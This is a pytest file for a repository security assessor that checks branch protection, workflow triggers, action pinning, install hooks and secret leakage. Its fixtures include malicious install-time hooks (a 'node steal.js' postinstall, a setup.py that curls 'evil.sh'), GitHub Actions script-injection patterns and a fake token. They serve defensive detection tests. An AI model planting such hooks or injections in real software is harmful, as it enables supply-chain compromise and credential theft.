"""Tests for the pure security assessor (``repofacts.security``).

Per the project's model-separation rule, the implementation's author did not
write these; every assertion here is independently owned.

The load-bearing invariant of this module is the same one ``rules.py`` has
for ``platform_check``: **a check that could not run must never render like
a check that passed.** Absent data is ``unchecked``; it is never ``pass``.
So most of these tests deliberately feed *missing* fields (``None`` /
``[]`` / ``{}``) and pin the result.

``security.py`` is pure — no network, no file I/O, no wall-clock reads
except the passed-in ``now``. These tests do none of those things either.
"""
from __future__ import annotations

import json
import sys
from dataclasses import asdict
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from repofacts.models import (  # noqa: E402
    SecurityFacts,
    SEV_HIGH,
    SEV_INFO,
    SEV_LOW,
    SEV_MED,
    STATUS_FAIL,
    STATUS_INFO,
    STATUS_PASS,
    STATUS_UNCHECKED,
    STATUS_WARN,
)
from repofacts.security import (  # noqa: E402
    _CHECK_ORDER,
    _check_binary_artifacts,
    _check_branch_protection,
    _check_contributors,
    _check_dangerous_workflow,
    _check_dependency_update_tool,
    _check_install_time_execution,
    _check_maintained,
    _check_pinned_dependencies,
    _check_security_policy,
    _check_signed_releases,
    _check_token_permissions,
    assess_security,
)

NOW = datetime(2026, 8, 24, 14, 0, 0, tzinfo=timezone.utc)
FETCHED = datetime(2026, 8, 24, 13, 0, 0, tzinfo=timezone.utc)


def _facts(**overrides):
    """A SecurityFacts with *everything* absent unless explicitly given.

    This is the shape ``github.py`` hands over when a fetch was refused,
    rate-limited, or 404'd — i.e. the shape that must never score well.
    """
    base = dict(owner="acme", repo="widget")
    base.update(overrides)
    return SecurityFacts(**base)


def _wf(body):
    return {"ci.yml": body}


def _statuses(report):
    return {f.name: f.status for f in report.findings}


# ---------------------------------------------------------------------------
# The headline invariant: absent data never scores
# ---------------------------------------------------------------------------


def test_empty_facts_produce_eleven_findings_and_not_one_pass():
    """A totally unfetched repo must not earn a single passing check.

    This is the anti-regression test the whole module exists for. If a
    future refactor makes any check default-to-pass on missing data, the
    tool starts certifying repos it never actually looked at.
    """
    report = assess_security(_facts())

    assert len(report.findings) == 11, f"expected 11 findings, got {len(report.findings)}"
    assert tuple(f.name for f in report.findings) == _CHECK_ORDER, (
        f"check names/order drifted: {tuple(f.name for f in report.findings)}"
    )
    assert report.owner == "acme" and report.repo == "widget", report

    passers = [(f.name, f.reason) for f in report.findings if f.status == STATUS_PASS]
    assert passers == [], f"unfetched repo produced passing checks: {passers}"


def test_every_check_whose_data_is_absent_reports_unchecked():
    """Ten of eleven checks have no data at all -> all ten say ``unchecked``."""
    got = _statuses(assess_security(_facts()))
    expected_unchecked = [n for n in _CHECK_ORDER if n != "SignedReleases"]

    wrong = {n: got[n] for n in expected_unchecked if got[n] != STATUS_UNCHECKED}
    assert wrong == {}, f"absent data did not report 'unchecked': {wrong}"


def test_no_releases_reports_info_and_is_never_mistaken_for_a_pass():
    """``releases=[]`` is the one absent-data branch that is not ``unchecked``.

    The source deliberately calls it ``info`` ("no releases to check")
    rather than ``unchecked``, because a repo genuinely may not publish
    releases. Pinning it here so the distinction is a decision, not an
    accident — and asserting the part that actually matters: it is not a
    pass, so an unfetched release list can never look like signed releases.
    """
    f = _check_signed_releases(_facts(releases=[]))
    assert f.status == STATUS_INFO, f
    assert f.status != STATUS_PASS, f
    assert f.severity == SEV_INFO, f


# ---------------------------------------------------------------------------
# BranchProtection
# ---------------------------------------------------------------------------


def test_branch_protection_status_ladder():
    """Every rung of the branch-protection ladder, including the two fails.

    ``required_approving_review_count: 0`` is the subtle one: protection
    exists, so a naive truthiness check would call it protected, but zero
    required reviewers means anyone with write access self-merges.
    """
    cases = [
        (None, STATUS_UNCHECKED, SEV_INFO, "no payload (404 / no permission)"),
        ({"enabled": False}, STATUS_FAIL, SEV_HIGH, "object present but disabled"),
        ({"enabled": True}, STATUS_WARN, SEV_MED, "protected, no reviewer block"),
        ({"enabled": True, "required_pull_request_reviews": {}},
         STATUS_WARN, SEV_MED, "reviewer block present but empty"),
        ({"enabled": True,
          "required_pull_request_reviews": {"required_approving_review_count": 0}},
         STATUS_FAIL, SEV_HIGH, "zero required reviews"),
        ({"enabled": True,
          "required_pull_request_reviews": {"required_approving_review_count": 2}},
         STATUS_PASS, SEV_INFO, "two required reviews"),
    ]
    for payload, want_status, want_sev, label in cases:
        f = _check_branch_protection(_facts(branch_protection=payload))
        assert f.status == want_status, f"{label}: expected {want_status}, got {f}"
        assert f.severity == want_sev, f"{label}: expected {want_sev}, got {f}"


# ---------------------------------------------------------------------------
# SecurityPolicy — the three-state field
# ---------------------------------------------------------------------------


def test_security_policy_none_false_and_true_are_three_distinct_states():
    """``None`` (lookup failed) must not collapse into ``False`` or ``True``.

    A bool field with a ``None`` third state is exactly where "unchecked
    renders as checked" bugs breed.
    """
    unchecked = _check_security_policy(_facts(has_security_policy=None))
    absent = _check_security_policy(_facts(has_security_policy=False))
    present = _check_security_policy(_facts(has_security_policy=True))

    assert unchecked.status == STATUS_UNCHECKED, unchecked
    assert absent.status == STATUS_FAIL and absent.severity == SEV_MED, absent
    assert present.status == STATUS_PASS, present

    trio = {unchecked.status, absent.status, present.status}
    assert len(trio) == 3, f"the three states collapsed: {trio}"


# ---------------------------------------------------------------------------
# The three workflow-derived checks
# ---------------------------------------------------------------------------


def test_all_three_workflow_checks_are_unchecked_when_no_workflows_fetched():
    """One empty dict must not silently clear three separate checks.

    ``workflow_files={}`` means "we never read the workflows" — it must not
    read as "we read them and found nothing wrong".
    """
    sec = _facts(workflow_files={})
    for f in (_check_dangerous_workflow(sec),
              _check_token_permissions(sec),
              _check_pinned_dependencies(sec)):
        assert f.status == STATUS_UNCHECKED, f
        assert f.status != STATUS_PASS, f


def test_pull_request_target_detected_in_every_valid_on_form():
    """GitHub accepts four ``on:`` spellings; all four are equally dangerous.

    REAL BUG (found 2026-08-24): only the mapping form was detected. The
    scalar, flow-list and block-list forms returned status ``pass`` with
    "no dangerous patterns" — an affirmative all-clear on a workflow that
    runs attacker-authored code against a privileged token. A false pass is
    worse than an ``unchecked``: it certifies rather than abstains.
    """
    forms = {
        "mapping": "on:\n  pull_request_target:\n    types: [opened]\n",
        "scalar": "on: pull_request_target\n",
        "flow-list": "on: [push, pull_request_target]\n",
        "block-list": "on:\n  - push\n  - pull_request_target\n",
    }
    tail = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
    for label, head in forms.items():
        f = _check_dangerous_workflow(_facts(workflow_files=_wf("name: ci\n" + head + tail)))
        assert f.status == STATUS_FAIL, f"{label} form not detected: {f}"
        assert f.severity == SEV_HIGH, f"{label} form: {f}"
        assert "pull_request_target" in f.reason, f"{label} form: {f}"
        assert "ci.yml" in f.reason, f"{label} form must name the offender: {f}"


def test_ordinary_pull_request_trigger_is_not_mistaken_for_the_dangerous_one():
    """The false-positive guard for the widened ``on:`` matching.

    ``pull_request`` is the safe trigger and by far the common one. If
    broadening detection of ``pull_request_target`` also caught plain
    ``pull_request``, every CI repo on GitHub would fail HIGH.
    """
    for head in ("on: pull_request\n",
                 "on: [push, pull_request]\n",
                 "on:\n  pull_request:\n    types: [opened]\n",
                 "on:\n  - push\n  - pull_request\n"):
        body = ("name: ci\n" + head
                + "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
                  "    steps:\n      - run: echo hi\n")
        f = _check_dangerous_workflow(_facts(workflow_files=_wf(body)))
        assert f.status == STATUS_PASS, f"safe trigger {head!r} flagged: {f}"


def test_event_interpolation_inside_a_run_block_is_script_injection():
    """``${{ github.event.* }}`` reaching a shell is the classic injection."""
    multiline = (
        "name: ci\non: issues\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: |\n"
        '          echo "${{ github.event.issue.title }}"\n'
    )
    inline = (
        "name: ci\non: issues\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: echo ${{ github.event.issue.title }}\n"
    )
    for label, body in (("multi-line run:", multiline), ("inline run:", inline)):
        f = _check_dangerous_workflow(_facts(workflow_files=_wf(body)))
        assert f.status == STATUS_FAIL, f"{label}: {f}"
        assert f.severity == SEV_HIGH, f"{label}: {f}"
        assert "script injection" in f.reason, f"{label}: {f}"


def test_event_interpolation_outside_a_run_block_is_not_flagged():
    """The false-positive guard: ``github.event`` in ``if:`` is not injection.

    Reading the event context in an expression is normal and safe. Only
    splicing it into shell text is dangerous. Over-flagging here would make
    the check noise, and noisy checks get ignored.
    """
    body = (
        "name: ci\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: echo first\n"
        "      - if: ${{ github.event.pull_request.draft == false }}\n"
        "        run: echo second\n"
    )
    f = _check_dangerous_workflow(_facts(workflow_files=_wf(body)))
    assert f.status == STATUS_PASS, f
    assert f.severity == SEV_INFO, f


def test_token_permissions_counts_only_the_top_level_block():
    """A job-level ``permissions:`` does not scope the whole workflow.

    Default ``GITHUB_TOKEN`` is write-all; only the file-level block
    downgrades every job. Treating a job-level block as equivalent would be
    a false pass.
    """
    top_level = (
        "name: ci\non: push\npermissions:\n  contents: read\n"
        "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
    )
    job_level_only = (
        "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    permissions:\n      contents: read\n    steps:\n      - run: echo hi\n"
    )
    good = _check_token_permissions(_facts(workflow_files=_wf(top_level)))
    assert good.status == STATUS_PASS and good.severity == SEV_INFO, good

    bad = _check_token_permissions(_facts(workflow_files=_wf(job_level_only)))
    assert bad.status == STATUS_WARN and bad.severity == SEV_MED, bad
    assert "write-all" in bad.reason, bad


def test_pinned_dependencies_distinguishes_sha_floating_and_local():
    """Only third-party floating tags count against the repo.

    A local ``./`` action is not a supply-chain dependency, so it must not
    drag the score down (a false fail is its own kind of broken).
    """
    sha = "0123456789abcdef0123456789abcdef01234567"
    head = "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"

    pinned = _check_pinned_dependencies(_facts(
        workflow_files=_wf(head + f"      - uses: actions/checkout@{sha}\n")))
    assert pinned.status == STATUS_PASS, pinned

    floating = _check_pinned_dependencies(_facts(
        workflow_files=_wf(head + "      - uses: actions/checkout@v4\n")))
    assert floating.status == STATUS_FAIL and floating.severity == SEV_MED, floating
    assert "v4" in floating.reason, floating

    local = _check_pinned_dependencies(_facts(
        workflow_files=_wf(head + "      - uses: ./.github/actions/build@v1\n")))
    assert local.status == STATUS_PASS, f"local action wrongly flagged: {local}"

    # A short SHA is not a pin — it is a floating ref that can be re-pointed.
    short = _check_pinned_dependencies(_facts(
        workflow_files=_wf(head + "      - uses: actions/checkout@0123456\n")))
    assert short.status == STATUS_FAIL, f"short SHA accepted as a pin: {short}"


# ---------------------------------------------------------------------------
# BinaryArtifacts
# ---------------------------------------------------------------------------


def test_binary_artifacts_needs_a_tree_and_only_counts_blobs():
    """No tree -> unchecked. A *directory* named ``x.dll`` is not a binary."""
    assert _check_binary_artifacts(_facts(tree_entries=[])).status == STATUS_UNCHECKED

    clean = _check_binary_artifacts(_facts(tree_entries=[
        {"path": "src/main.py", "type": "blob"},
        {"path": "README.md", "type": "blob"},
    ]))
    assert clean.status == STATUS_PASS and clean.severity == SEV_INFO, clean

    dirty = _check_binary_artifacts(_facts(tree_entries=[
        {"path": "vendor/engine.so", "type": "blob"},
        {"path": "src/main.py", "type": "blob"},
    ]))
    assert dirty.status == STATUS_WARN and dirty.severity == SEV_LOW, dirty
    assert "vendor/engine.so" in dirty.reason, dirty

    tree_only = _check_binary_artifacts(_facts(tree_entries=[
        {"path": "vendor/engine.dll", "type": "tree"},
    ]))
    assert tree_only.status == STATUS_PASS, f"directory counted as a binary: {tree_only}"


# ---------------------------------------------------------------------------
# Contributors
# ---------------------------------------------------------------------------


def test_contributors_with_zero_totals_is_unchecked_not_pass():
    """GitHub's ``/contributors`` can return rows with no usable counts.

    Zero total commits is no signal at all. Dividing by it, or letting the
    even-spread branch catch it, would score a repo we learned nothing
    about — the exact false pass this module forbids.
    """
    assert _check_contributors(_facts(contributors=[])).status == STATUS_UNCHECKED

    zeroed = _check_contributors(_facts(contributors=[
        {"login": "alice", "contributions": 0},
        {"login": "bob", "contributions": 0},
    ]))
    assert zeroed.status == STATUS_UNCHECKED, zeroed
    assert zeroed.status != STATUS_PASS, zeroed

    # Rows missing the field entirely are dropped, not counted as zero.
    missing_field = _check_contributors(_facts(contributors=[{"login": "alice"}]))
    assert missing_field.status == STATUS_UNCHECKED, missing_field


def test_contributors_bus_factor_ladder():
    """Concentration and a lone maintainer both warn; a real spread passes."""
    dominant = _check_contributors(_facts(contributors=[
        {"login": "alice", "contributions": 90},
        {"login": "bob", "contributions": 7},
        {"login": "carol", "contributions": 3},
    ]))
    assert dominant.status == STATUS_WARN and dominant.severity == SEV_MED, dominant
    assert "90%" in dominant.reason, dominant

    # A lone maintainer is 100% concentrated, so it trips the >70% branch
    # first. (The source's separate ``len(counts) <= 1`` branch with its
    # "bus factor = 1" wording is therefore unreachable — a single
    # contributor can never have a share <= 70%. Same warn/MED outcome
    # either way, so this is dead wording, not a behaviour defect.)
    solo = _check_contributors(_facts(contributors=[{"login": "alice", "contributions": 42}]))
    assert solo.status == STATUS_WARN and solo.severity == SEV_MED, solo
    assert "100%" in solo.reason, solo
    assert "1 contributor(s)" in solo.reason, solo

    spread = _check_contributors(_facts(contributors=[
        {"login": n, "contributions": 25} for n in ("alice", "bob", "carol", "dave")
    ]))
    assert spread.status == STATUS_PASS and spread.severity == SEV_INFO, spread


# ---------------------------------------------------------------------------
# DependencyUpdateTool
# ---------------------------------------------------------------------------


def test_dependency_update_tool_none_is_distinct_from_absent():
    """Both lookups failing (``None``) must not read as "no tool configured"."""
    unchecked = _check_dependency_update_tool(
        _facts(has_dependabot_config=None, has_renovate_config=None))
    absent = _check_dependency_update_tool(
        _facts(has_dependabot_config=False, has_renovate_config=False))
    dependabot = _check_dependency_update_tool(
        _facts(has_dependabot_config=True, has_renovate_config=False))
    renovate = _check_dependency_update_tool(
        _facts(has_dependabot_config=False, has_renovate_config=True))

    assert unchecked.status == STATUS_UNCHECKED, unchecked
    assert absent.status == STATUS_WARN and absent.severity == SEV_LOW, absent
    assert unchecked.status != absent.status, (unchecked.status, absent.status)
    assert dependabot.status == STATUS_PASS and "Dependabot" in dependabot.reason, dependabot
    assert renovate.status == STATUS_PASS and "Renovate" in renovate.reason, renovate

    # A half-failed lookup still has one real answer, so it is not unchecked.
    half = _check_dependency_update_tool(
        _facts(has_dependabot_config=None, has_renovate_config=True))
    assert half.status == STATUS_PASS, half


# ---------------------------------------------------------------------------
# InstallTimeExecution
# ---------------------------------------------------------------------------


def test_install_time_execution_ladder():
    """npm install hooks and setup.py side effects fail; build.rs is only info."""
    assert _check_install_time_execution(_facts(manifests={})).status == STATUS_UNCHECKED

    postinstall = _check_install_time_execution(_facts(manifests={
        "package.json": '{"name":"x","scripts":{"postinstall":"node steal.js"}}'}))
    assert postinstall.status == STATUS_FAIL and postinstall.severity == SEV_HIGH, postinstall

    setup_py = _check_install_time_execution(_facts(manifests={
        "setup.py": "from setuptools import setup\nimport subprocess\n"
                    "subprocess.check_call(['curl', 'evil.sh'])\nsetup(name='x')\n"}))
    assert setup_py.status == STATUS_FAIL and setup_py.severity == SEV_HIGH, setup_py

    cargo = _check_install_time_execution(_facts(manifests={
        "Cargo.toml": '[package]\nname = "x"\n[build-dependencies]\ncc = "1"\n'}))
    assert cargo.status == STATUS_INFO and cargo.severity == SEV_LOW, cargo
    assert cargo.status not in (STATUS_FAIL, STATUS_PASS), cargo

    clean = _check_install_time_execution(_facts(manifests={
        "package.json": '{"name":"x","scripts":{"test":"jest","build":"tsc"}}'}))
    assert clean.status == STATUS_PASS and clean.severity == SEV_INFO, clean


def test_install_time_execution_survives_a_malformed_manifest():
    """A junk manifest must not crash the assessor or mask a real finding."""
    f = _check_install_time_execution(_facts(manifests={
        "package.json": "\x00 not json at all {{{",
        "pkg/package.json": '{"scripts":{"preinstall":"./run.sh"}}',
    }))
    assert f.status == STATUS_FAIL, f
    assert "pkg/package.json" in f.reason, f


# ---------------------------------------------------------------------------
# Maintained — the only time-dependent check
# ---------------------------------------------------------------------------


def test_maintained_is_unchecked_rather_than_reading_the_wall_clock():
    """With no ``now`` and no ``fetched_at`` the check must abstain.

    The purity rule says this module never reads the clock. The only honest
    outcome when there is no timestamp is ``unchecked`` — even though the
    commit data itself is present and would otherwise pass.
    """
    sec = _facts(fetched_at=None, commit_activity_weeks=[
        {"week": 0, "total": 5, "days": [0] * 7}])
    f = _check_maintained(sec, now=None)
    assert f.status == STATUS_UNCHECKED, f
    assert f.status != STATUS_PASS, f

    # Same through the public entry point, which resolves now -> fetched_at.
    assert _statuses(assess_security(sec))["Maintained"] == STATUS_UNCHECKED


def test_maintained_ladder_and_now_resolution():
    """No data -> unchecked; silent 90 days -> warn; recent commits -> pass."""
    quiet = [{"week": i * 604800, "total": 0, "days": [0] * 7} for i in range(52)]
    busy = quiet[:39] + [{"week": i * 604800, "total": 3, "days": [0, 1, 1, 1, 0, 0, 0]}
                         for i in range(39, 52)]

    no_data = _check_maintained(_facts(fetched_at=FETCHED, commit_activity_weeks=[]), now=NOW)
    assert no_data.status == STATUS_UNCHECKED, f"empty weeks must not warn: {no_data}"

    stale = _check_maintained(_facts(commit_activity_weeks=quiet), now=NOW)
    assert stale.status == STATUS_WARN and stale.severity == SEV_MED, stale
    assert "trailing 90 days" in stale.reason, stale

    alive = _check_maintained(_facts(commit_activity_weeks=busy), now=NOW)
    assert alive.status == STATUS_PASS and alive.severity == SEV_INFO, alive
    assert "39 commit(s)" in alive.reason, alive

    # ``fetched_at`` stands in for ``now`` when the caller omits it, so the
    # same facts must not flip to unchecked just because now was not passed.
    via_fetched_at = assess_security(
        _facts(fetched_at=FETCHED, commit_activity_weeks=busy))
    assert _statuses(via_fetched_at)["Maintained"] == STATUS_PASS, via_fetched_at.findings


def test_maintained_only_scores_the_trailing_thirteen_weeks():
    """Activity a year ago must not be counted as activity in the last 90 days.

    GitHub returns 52 oldest-first weekly buckets. Slicing from the wrong
    end would resurrect a long-dead repo as "maintained".
    """
    old_only = ([{"week": i * 604800, "total": 50, "days": [0] * 7} for i in range(39)]
                + [{"week": i * 604800, "total": 0, "days": [0] * 7} for i in range(39, 52)])
    f = _check_maintained(_facts(commit_activity_weeks=old_only), now=NOW)
    assert f.status == STATUS_WARN, f"year-old commits counted as recent: {f}"
    assert "no commits in trailing 90 days" in f.reason, f


# ---------------------------------------------------------------------------
# Output hygiene and purity
# ---------------------------------------------------------------------------


def test_report_never_echoes_fetched_file_contents_or_secrets():
    """No output mode — including ``--json`` — may carry secret material.

    The assessor summarises; it must never quote a file body back out. A
    token pasted into a workflow, a manifest, or the fetch-error string has
    to stay inside the input dataclass.
    """
    secret = "ghp_FAKE0000TESTTOKEN0000NOTREAL00000000"
    sec = _facts(
        workflow_files=_wf(
            "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            f"    env:\n      GH_TOKEN: {secret}\n"
            f"    steps:\n      - run: echo {secret}\n"),
        manifests={"package.json": '{"name":"x","_auth":"%s"}' % secret},
        error=f"fetch failed: Authorization: Bearer {secret}",
        has_security_policy=True,
    )
    report = assess_security(sec, now=NOW)

    for f in report.findings:
        assert secret not in f.reason, f"secret leaked into {f.name}.reason: {f.reason!r}"
        assert secret not in f.name, f"secret leaked into a finding name: {f.name!r}"

    # The --json path serialises the whole report; nothing may ride along.
    assert secret not in json.dumps(asdict(report)), "secret leaked into --json output"
    assert secret not in repr(report), "secret leaked into repr(report)"


def test_assess_security_does_not_mutate_its_input():
    """A pure assessor must leave the caller's facts byte-identical.

    ``SecurityFacts`` is a mutable dataclass holding shared dicts/lists; an
    in-place edit here would silently corrupt whatever the CLI renders next.
    """
    sec = _facts(
        branch_protection={"enabled": True,
                           "required_pull_request_reviews": {"required_approving_review_count": 1}},
        has_security_policy=True,
        releases=[{"tag_name": "v1", "assets": [{"name": "app.tar.gz"}]}],
        workflow_files=_wf("name: ci\non: push\njobs:\n  b:\n    steps:\n      - run: echo hi\n"),
        tree_entries=[{"path": "src/main.py", "type": "blob"}],
        contributors=[{"login": "alice", "contributions": 10},
                      {"login": "bob", "contributions": 9}],
        commit_activity_weeks=[{"week": 0, "total": 2, "days": [0] * 7}],
        has_dependabot_config=True,
        has_renovate_config=False,
        manifests={"package.json": '{"name":"x"}'},
        fetched_at=FETCHED,
        error=None,
    )
    before = json.dumps(asdict(sec), sort_keys=True, default=str)
    assess_security(sec, now=NOW)
    after = json.dumps(asdict(sec), sort_keys=True, default=str)
    assert before == after, "assess_security mutated the SecurityFacts it was given"
